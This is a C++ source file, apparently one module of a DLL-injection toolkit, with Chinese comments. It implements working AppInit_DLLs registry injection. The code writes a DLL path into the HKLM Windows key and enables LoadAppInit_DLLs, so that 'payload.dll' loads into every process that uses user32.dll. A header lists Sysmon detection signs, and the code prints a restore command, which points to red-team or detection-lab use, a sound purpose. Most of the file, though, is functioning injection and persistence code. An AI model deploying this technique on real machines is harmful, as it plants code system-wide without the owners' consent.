// ════════════════════════════════════════════════════════════════
//  方法 9: 注册表注入 (AppInit_DLLs)
//
//  原理：
//    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
//    的 AppInit_DLLs 值中写入 DLL 路径，
//    所有加载 user32.dll 的进程启动时会自动加载该 DLL。
//    LoadAppInit_DLLs 必须为 1。
//
//  检测特征：
//    - 注册表修改: AppInit_DLLs 键值变更
//    - Sysmon Event 7:  大量进程同时加载 payload.dll
//    - Sysmon Event 12/13: 注册表键值创建/修改
//    - 特殊：影响范围极大，所有 GUI 进程都会加载
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <iostream>

bool Inject_Registry(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 注册表注入 (AppInit_DLLs) → PID=%lu\n", pid);
    Print(L"  [!] 警告: 此方法会影响所有加载 user32.dll 的进程!\n\n");

    // 1. 获取 DLL 的完整路径
    wchar_t fullPath[MAX_PATH]{};
    if (!GetFullPathNameW(dllPath, MAX_PATH, fullPath, nullptr))
    {
        Print(L"  [!] 获取完整路径失败\n");
        return false;
    }
    Print(L"  [+] DLL 完整路径: %s\n", fullPath);

    // 2. 写入 AppInit_DLLs
    HKEY hKey = nullptr;
    LSTATUS ok = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);

    if (ok != ERROR_SUCCESS)
    {
        Print(L"  [!] 打开注册表失败: %lu (需要管理员权限)\n", ok);
        return false;
    }

    // 读取当前值（备份）
    wchar_t oldValue[2048]{};
    DWORD oldSize = sizeof(oldValue);
    RegQueryValueExW(hKey, L"AppInit_DLLs", nullptr, nullptr,
        (BYTE*)oldValue, &oldSize);
    Print(L"  [*] 当前 AppInit_DLLs: %s\n", oldValue[0] ? oldValue : L"(空)");

    // 写入新值
    ok = RegSetValueExW(hKey, L"AppInit_DLLs", 0, REG_SZ,
        (BYTE*)fullPath, (DWORD)(wcslen(fullPath) + 1) * 2);
    if (ok != ERROR_SUCCESS)
    {
        Print(L"  [!] 写入 AppInit_DLLs 失败: %lu\n", ok);
        RegCloseKey(hKey);
        return false;
    }

    // 确保 LoadAppInit_DLLs = 1
    DWORD loadFlag = 1;
    RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD,
        (BYTE*)&loadFlag, sizeof(loadFlag));

    RegCloseKey(hKey);

    Print(L"  [+] AppInit_DLLs 已设置\n");
    Print(L"  [*] 新启动的进程（加载 user32.dll）将自动加载 payload.dll\n");
    Print(L"  [*] 恢复命令: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"%s\" /f\n", oldValue);
    Print(L"  [✓] 注册表注入已部署\n");
    return true;
}
